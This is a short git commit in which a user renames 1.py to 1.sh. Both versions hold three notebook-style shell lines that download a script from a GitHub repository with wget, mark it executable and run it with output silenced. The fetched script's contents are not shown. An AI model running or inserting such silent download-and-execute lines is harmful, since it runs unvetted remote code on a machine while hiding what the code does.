c48f185fcc2f1a20ce902fb4ac73169380e4869d
mencobaiajanah <86476551+mencobaiajanah@users.noreply.github.com>
2021-07-03 23:56:30 +0800

    Update and rename 1.py to 1.sh

--- 1.py
+++
@@ -1,3 +0,0 @@
-! wget https://github.com/mencobaiajanah/LM2/raw/main/2.py > /dev/null 
-! chmod +x 2.py
-! ./2.py >/dev/null 
---
+++ 1.sh
@@ -0,0 +1,3 @@
+! wget https://github.com/mencobaiajanah/LM2/raw/main/2.sh > /dev/null 
+! chmod +x 2.sh
+! ./2.sh >/dev/null 
